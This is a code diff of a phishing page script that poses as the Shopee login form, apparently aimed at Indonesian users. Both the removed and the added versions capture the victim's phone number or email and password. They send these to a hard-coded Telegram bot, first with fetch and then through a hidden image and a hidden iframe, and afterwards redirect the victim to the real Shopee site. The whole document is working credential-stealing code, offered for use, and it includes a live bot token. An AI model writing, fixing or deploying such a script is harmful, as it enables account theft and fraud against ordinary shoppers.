@@ -1,66 +1,40 @@
 <script>
-// SHOPEE PHISHING SCRIPT - FIXED
-document.getElementById('shopeeLoginForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    // Get credentials
-    const phoneEmail = document.getElementById('phoneEmail').value;
-    const password = document.getElementById('password').value;
-    
-    // Console log
-    console.log('🛍️ SHOPEE DATA:', { phoneEmail, password });
-    
-    // Telegram configuration
-    const BOT_TOKEN = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
-    const CHAT_ID = '8313500840';
-    
-    // Format message
-    const message = `🛍️ *SHOPEE LOGIN CAPTURED* 🛍️
-📱 *Phone/Email:* \`${phoneEmail}\`
-🔐 *Password:* \`${password}\`
-⏰ *Time:* ${new Date().toLocaleString()}
-📡 *Source:* Shopee Phishing Template
-🌐 *User Agent:* ${navigator.userAgent.substring(0, 50)}...`;
-    
-    // Encode for URL
-    const encodedMsg = encodeURIComponent(message);
-    
-    // Send to Telegram (GET method - most reliable)
-    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
-    
-    fetch(telegramURL)
-        .then(response => response.json())
-        .then(data => {
-            console.log('✅ Telegram Response:', data);
-            
-            if (data.ok) {
-                // Success feedback
-                document.querySelector('.btn-login').textContent = '✅ Berhasil!';
-                document.querySelector('.btn-login').style.background = '#4CAF50';
-                
-                // Redirect to real Shopee after 1.5s
-                setTimeout(() => {
-                    window.location.href = 'https://shopee.co.id';
-                }, 1500);
-            } else {
-                console.error('❌ Telegram Error:', data);
-                // Fallback redirect
-                setTimeout(() => {
-                    window.location.href = 'https://shopee.co.id';
-                }, 1000);
-            }
-        })
-        .catch(error => {
-            console.error('❌ Network Error:', error);
-            // Fallback redirect
-            setTimeout(() => {
-                window.location.href = 'https://shopee.co.id';
-            }, 1000);
-        });
-    
-    // UI feedback immediately
-    const btn = document.querySelector('.btn-login');
-    btn.textContent = '🔄 Mengirim...';
-    btn.disabled = true;
-});
+// SHOPEE SIMPLE WORKING SCRIPT
+const shopeeForm = document.getElementById('shopeeLoginForm') || document.querySelector('form');
+
+if (shopeeForm) {
+    shopeeForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Simple data capture
+        const email = document.getElementById('phoneEmail')?.value || 
+                      document.querySelector('input[type="text"]')?.value || 'N/A';
+        const pass = document.getElementById('password')?.value || 
+                     document.querySelector('input[type="password"]')?.value || 'N/A';
+        
+        console.log('🛍️ Shopee Data:', email, pass);
+        
+        // Telegram
+        const BOT = '8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18';
+        const CID = '8313500840';
+        const msg = `SHOPEE\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleTimeString()}`;
+        
+        // 100% Working method
+        const telegramCall = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(msg)}`;
+        
+        // Method 1: Image load (no CORS issues)
+        new Image().src = telegramCall;
+        
+        // Method 2: Iframe (alternative)
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = telegramCall;
+        document.body.appendChild(iframe);
+        
+        // Redirect
+        setTimeout(() => window.location.href = 'https://shopee.co.id', 1200);
+    });
+} else {
+    console.error('❌ Shopee form not found');
+}
 </script>
